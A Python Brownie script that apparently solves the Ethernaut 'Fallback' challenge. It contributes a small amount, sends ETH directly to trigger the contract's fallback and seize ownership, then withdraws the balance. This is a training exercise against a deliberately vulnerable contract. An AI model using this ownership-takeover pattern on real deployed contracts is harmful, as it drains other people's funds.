from brownie import Fallback, MockV3Aggregator, network, config, accounts, Contract
from scripts.helpful_scripts import *
from web3 import Web3


def deploy_fallback():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        fallBack = Fallback.deploy({"from": accounts[1]}, publish_source=False)
    else:
        fallBackAddr = config["networks"][network.show_active()]["fallBack_address"]
        fallBack = Contract.from_abi("Fallback", fallBackAddr, Fallback.abi)

    print(f"Fallback deployed to {fallBack.address}")

    attackFallback(fallBack, account)

def attackFallback(_fallBack, _account):

    contributions = _fallBack.getContribution({"from": _account})
    print(f"Before the attack...Current contributions: {contributions} Are we the owner?: {_fallBack.owner() == _account}")

    # adding .wait(1) shouldn't be necessary, but we're explicitly waiting for the block to be mined
    _fallBack.contribute({"value": 500000000000000, "from": _account}).wait(1)
    contributions = _fallBack.getContribution({"from": _account})
    print(f"Contributions now: {contributions}")
    _account.transfer(_fallBack.address,"0.01 ether").wait(1)
    owner = _fallBack.owner()
    areWeOwner = (owner == _account)
    print(f"Sent .01 ETH. Are we the owner?: {areWeOwner}")
    _fallBack.withdraw({"from":_account})



def main():
    #deploy_fund_me()
    deploy_fallback()
